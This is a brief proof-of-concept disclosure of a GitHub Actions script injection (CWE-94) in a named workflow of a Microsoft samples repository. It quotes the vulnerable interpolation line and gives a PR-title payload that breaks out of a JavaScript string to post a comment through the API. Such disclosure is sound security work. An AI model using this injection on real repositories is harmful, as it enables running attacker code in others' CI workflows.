# PoC: GitHub Actions Script Injection

Demonstrates CWE-94 in microsoft/Xbox-GDK-Samples
`.github/workflows/pr-summary-generate.yml` line 159

## Vulnerable pattern:
```javascript
const title = '${{ steps.generate.outputs.title }}';
```

## To reproduce:
1. Open a PR with title containing: `test'); github.rest.issues.createComment({owner:context.repo.owner,repo:context.repo.repo,issue_number:context.issue.number,body:'INJECTED'}); //`
2. The workflow executes the injected code
